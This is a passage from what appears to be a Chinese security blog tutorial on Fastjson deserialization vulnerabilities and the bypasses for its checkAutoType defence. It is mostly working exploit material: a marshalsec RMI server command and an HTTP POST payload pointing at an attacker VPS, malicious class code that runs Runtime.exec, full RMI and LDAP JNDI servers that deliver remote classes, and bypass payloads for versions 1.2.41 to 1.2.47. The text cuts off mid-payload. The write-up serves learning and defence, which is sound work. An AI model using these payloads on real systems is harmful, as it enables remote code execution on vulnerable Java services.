&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;your-vps&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p>向靶场服务器发送Payload，带上RMI的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;your-vps:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，命令已成功执行：</p><h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><p>漏洞原理：Fastjson通过bytecodes字段传入恶意类，调用outputProperties属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。</p><p>但是由于需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField，所以利用面很窄，但是这条利用链还是值得去学习<br>详情可看 <a href="https://xz.aliyun.com/t/8979#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/8979#toc-6</a>   </p><h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><p>JdbcRowSetImpl利用链最终的结果是导致JNDI注入，可以使用RMI+JNDI和RMI+LDAP进行利用 </p><h3 id="RMI-JNDI"><a href="#RMI-JNDI" class="headerlink" title="RMI+JNDI"></a>RMI+JNDI</h3><p>编译badClassName.java文件，并起一个WEB服务放入，这里端口设置为8888<br>badClassName.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">badClassName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNDIServer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1200</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"calc"</span>,</span><br><span class="line">                <span class="string">"badClassName"</span>,<span class="string">"http://127.0.0.1:8888/"</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"calc"</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1200/calc\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="LDAP-JNDI"><a href="#LDAP-JNDI" class="headerlink" title="LDAP+JNDI"></a>LDAP+JNDI</h3><p>编译badClassName.java文件，并起一个WEB服务放入，这里端口设置为8888<br>badClassName.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">badClassName</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LdapServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">LDAPServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String LDAP_BASE = <span class="string">"dc=example,dc=com"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8888/#badClassName"</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                    <span class="string">"listen"</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">"0.0.0.0"</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> OperationInterceptor(<span class="keyword">new</span> URL(url)));</span><br><span class="line">            InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title">InMemoryOperationInterceptor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">"javaCodeBase"</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">"objectClass"</span>, <span class="string">"javaNamingReference"</span>);</span><br><span class="line">            e.addAttribute(<span class="string">"javaFactory"</span>, <span class="keyword">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用,触发恶意代码   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/badClassName\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="checkAutotype安全机制"><a href="#checkAutotype安全机制" class="headerlink" title="checkAutotype安全机制"></a>checkAutotype安全机制</h1><p>Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。<br>com/alibaba/fastjson/parser/ParserConfig.java </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">String deny;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">      deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">      <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">          <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">      deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">      <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/java/fastjson/1.jpg" alt=""></p><h1 id="Fastjson-1-2-41"><a href="#Fastjson-1-2-41" class="headerlink" title="Fastjson 1.2.41"></a>Fastjson 1.2.41</h1><p>1.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">      String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/badClassName\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">      JSON.parseObject(payload);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;”</p><p>在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与;   </p><p>通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">                   clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader, <span class="keyword">false</span>);</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure><p>进入loadClass</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="keyword">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">                String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ……</span><br></pre></td></tr></table></figure><p> <code>”[”、 ”L”、”;”</code>这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。<br>用来解析传入的数组类型的Class对象字符串(JNI字段描述符)      </p><p>详情可看：<br><a href="https://www.anquanke.com/post/id/215753#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215753#h2-1</a>   </p><h1 id="Fastjson-1-2-42"><a href="#Fastjson-1-2-42" class="headerlink" title="Fastjson 1.2.42"></a>Fastjson 1.2.42</h1><p>不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。 针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接</p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a>  </p><p>开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，<br>以便将恶意数据暴露出来，再经过黑名单校验 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="keyword">int</span> features) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeName.length() &lt; <span class="number">128</span> &amp;&amp; typeName.length() &gt;= <span class="number">3</span>) &#123;</span><br><span class="line">            String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">long</span> BASIC = -<span class="number">3750763034362895579L</span>;</span><br><span class="line">            <span class="keyword">long</span> PRIME = <span class="number">1099511628211L</span>;</span><br><span class="line">            <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="keyword">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="keyword">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">                className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure><p>绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">    String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1389/badClassName\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line">    JSON.parseObject(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Fastjson-1-2-45"><a href="#Fastjson-1-2-45" class="headerlink" title="Fastjson 1.2.45"></a>Fastjson 1.2.45</h1><p>在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。</p><p>之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。</p><p>本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。<br>pom.xml</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.5.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>利用poc如下 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">    String payload = <span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://127.0.0.1:1389/badClassName\"&#125;&#125;"</span>;</span><br><span class="line">    JSON.parseObject(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Fastjson-1-2-47"><a href="#Fastjson-1-2-47" class="headerlink" title="Fastjson 1.2.47"></a>Fastjson 1.2.47</h1><p>Fastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行。   </p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">     String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> +</span><br><span class="line">             <span 